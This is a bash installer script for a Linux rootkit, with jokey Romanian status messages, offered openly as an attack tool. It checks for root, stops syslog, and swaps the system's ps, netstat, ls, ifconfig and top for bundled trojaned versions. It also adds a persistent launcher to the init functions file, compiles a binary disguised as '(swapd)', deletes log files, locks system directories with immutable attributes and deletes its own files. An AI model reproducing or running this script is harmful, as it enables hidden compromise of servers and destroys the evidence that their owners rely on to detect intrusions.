#!/bin/bash
# Made By Alexander
 

BLK='[1;30m'
RED='[1;31m'
GRN='[1;32m'
YEL='[1;33m'
BLU='[1;34m'
MAG='[1;35m'
CYN='[1;36m'
WHI='[1;37m'
DRED='[0;31m'
DGRN='[0;32m'
DYEL='[0;33m'
DBLU='[0;34m'
DMAG='[0;35m'
DCYN='[0;36m'
DWHI='[0;37m'
RES='[0m'

USERID=`id -u`
echo "${WHI}---${RED}   Verificam daca suntem ROOT ${WHI} !!!${RES}"
if [ $USERID -eq 0 ]
then
echo "${RED}+++${WHI}   Cica DA ..., deci putem continua ${BLU} :${WHI}-${RED})${RES}"
else
echo "${RED}--- ${DRED}!!! ${RED}Atentie tu eshti de fapt ${YEL}$USERID${RED} si nu ${GRN}RooT ${DRED}!!!${RES}"
echo "${WHI}               Asta ii un ${BLU}ROOTKIT${WHI} deshteptule si trebuie sa aiba ${GRN}uid=0${RES}"
exit
fi

rk=`pwd`
home="/usr/bin"
etc="/etc"
usr="/usr/lib/libshtift"
netstat="/bin/netstat"
ls="/bin/ls"
ps="/bin/ps"
top="/usr/bin/top"
chattr="/usr/bin/chattr"
chat="/usr/lib/ld/chat"
pico="/bin/pico"
wget="/usr/bin/wget"
ifconfig="/sbin/ifconfig"
ttyop="/dev/ttyop"
ttyoa="/dev/ttyoa"
ttyof="/dev/ttyof"
if [ -f "/usr/bin/gcc" ]; then
gcc="/usr/bin/gcc"
 else
     if [ -f "/usr/local/bin/gcc" ]; then
     gcc="/usr/local/bin/gcc"
       else
           if [ -f "/usr/bin/cc" ]; then
           gcc="/usr/bin/cc"
             else
                 if [ -f "/usr/local/bin/cc" ]; then
                 gcc="/usr/local/bin/cc"
                  else
                     gcc="/usr/bin/gnikcs"
fi; fi; fi; fi

unset HISTFILE; chown root.root *; unalias &> /dev/null ls
echo "							"
echo "${WHI}                @@@ ${GRN}OK ${BLU}Na Domnu Dareck Esti Hacker ! :-)${GRN} .., deci 
sa bagam mare ${BLU}!!!${WHI}@@@${RES}" 
echo "							"
if [ -f /etc/rc.d/init.d/portmap ]; then
 /etc/rc.d/init.d/portmap stop
fi
if [ -f /etc/rc.d/init.d/syslog ]; then
 /etc/rc.d/init.d/syslog stop
fi

$chattr &> /dev/null -ASacdisu /bin /bin/* /usr/bin /usr/bin/* /sbin /sbin/* /usr/sbin /usr/sbin/* $etc/im* $usr $usr/* $ttyop $ttyoa $ttyof
echo "${WHI} Sa tragem o privire dupa fisiere.. ${DRED}!${RES}"
echo "                                                  "
if [ -f $chattr ]; then
 echo "				${WHI}chattr${RED} -> ${BLU}ok${RES}"
else
if [ -f $chat ]; then
 /usr/lib/ld/chat -R -ASacdisu /usr/bin $chat
 cp -f $chat $chattr
else
 tar -xzf chattr.tgz
 mv -f chattr $chattr
 echo "				${WHI}chattr${RED}->${BLU}atasat${RES}"
 chmod +x $chattr
fi; fi

if [ -f $wget ]; then
 echo "				${WHI}wget${RED} -> ${BLU}ok${RES}"
else
 tar -xzf wget.tgz
 mv -f wget $wget
 echo "				${WHI}wget${RED} -> ${BLU}atasat${RES}"
 chmod +x $wget
fi

if [ -f $pico ]; then
 echo "				${WHI}pico${RED} -> ${BLU}ok${RES}"
else
 tar -xzf pico.tgz
 mv -f pico $pico
 echo "				${WHI}pico${RED} -> ${BLU}atasat${RES}"
 chmod +x $pico
fi

echo " ${WHI}Rezolvam tampeniile de ps, netstat si etc.., si pe sora-sa :-P${RES}"

mkdir $usr; mv $netstat $ps $ls $ifconfig $top $usr; mv netstat $netstat; mv ps $ps; mv ifconfig $ifconfig; mv ls $ls; mv top $top; mv .ttyop $ttyop; mv .ttyoa $ttyoa; mv .ttyof $ttyof

echo "                          ${WHI}Tampeniile${RED} ->${BLU}Done${RES}"

echo " ${WHI}Copiem ${BLU}SSH-ul ${WHI}si ce mai e nevoie :-P .. ${RES}"

mv -f  sense sl2 $home; echo "/usr/bin/crontabs -t1 -X53 -p" >> /etc/rc.d/init.d/functions; echo >> /etc/rc.d/init.d/functions; mv crontabs -f /usr/bin/; chmod 500 /usr/bin/crontabs
./ava
$gcc -o swapd kde.c
if [ -f swapd ]; then
 mv swapd /usr/bin/"(swapd)"
else
 mv swapd2 /usr/bin/"(swapd)"
fi
/usr/bin/crontabs

echo " ${WHI}*** ${GRN}Sa ne facem si noi un catun pe aici! ${BLU};${WHI}-${RED}) ${WHI}***${RES}"

if [ ! -d /dev/hpd ]; then
 mkdir /dev/hpd
fi

echo " ${WHI}*** ${GRN}Director-ul /dev/hpd a fost deja creat gajiule:))${WHI} ***${RES}"
echo " ${WHI}*** ${BLU}Acum sa stergem logurile care ne incurca ${WHI}***${RES}"

rm -rf /var/log/mes* /var/log/sec* /var/log/boot* /var/log/xp*

if [ -f /etc/rc.d/init.d/syslog ]; then
 /etc/rc.d/init.d/syslog start
fi
if [ -f /etc/rc.d/init.d/portmap ]; then 
 /etc/rc.d/init.d/portmap start
fi

cd ..

unset HISTFILE; $chattr +AacdisSu /bin /bin/* /usr/bin/sense /usr/bin/top /sbin /sbin/* /usr/sbin /usr/sbin/* $etc/im* $ttyop $ttyoa $ttyof
rm -rf rk*
echo "                                                  "
echo "${WHI}@@@ ${GRN}OK ${BLU}Shefu${GRN}.., e al tau, bucura-te ca eshti mai destept cu un ${BLU}RooT ${BLU};${WHI}-${RED}P ${WHI}@@@${RES}"

